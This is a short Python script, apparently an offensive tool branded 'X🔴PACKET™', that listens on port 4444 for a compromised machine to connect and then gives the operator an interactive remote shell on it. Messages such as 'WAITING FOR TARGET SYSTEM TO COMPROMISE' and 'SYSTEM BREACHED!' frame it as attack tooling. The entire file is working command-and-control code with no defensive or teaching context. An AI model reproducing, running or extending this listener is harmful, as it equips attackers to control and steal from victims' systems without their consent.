import socket
import sys

def start_listener(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)
    print(f"\n[💀] X🔴PACKET™ LISTENER ACTIVE ON {ip}:{port}...")
    print("[💀] WAITING FOR TARGET SYSTEM TO COMPROMISE...")
    
    conn, addr = s.accept()
    print(f"\n[🔥] SYSTEM BREACHED! CONNECTION FROM {addr}")
    while True:
        command = input(f"X🔴PACKET@{addr[0]}:~$ ")
        if command.lower() == 'exit': break
        conn.send(command.encode())
        print(conn.recv(10240).decode())
    conn.close()

if __name__ == "__main__":
    start_listener("0.0.0.0", 4444)
